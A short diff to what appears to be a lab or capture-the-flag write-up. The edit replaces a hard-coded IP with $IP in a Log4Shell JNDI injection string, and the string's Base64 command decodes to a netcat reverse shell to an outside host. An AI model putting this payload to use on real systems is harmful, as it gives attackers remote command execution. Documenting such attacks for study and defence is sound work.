@@ -50,7 +50,7 @@ let's try get shell
 
 
 ```
-${jndi:ldap://192.168.43.129:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjE4LjAuNTMgNDQ0NCAgPi90bXAvZg==}
+${jndi:ldap://$IP:1389/Basic/Command/Base64/cm0gL3RtcC9mO21rZmlmbyAvdG1wL2Y7Y2F0IC90bXAvZnxzaCAtaSAyPiYxfG5jIDEwLjE4LjAuNTMgNDQ0NCAgPi90bXAvZg==}
 
 ```
 
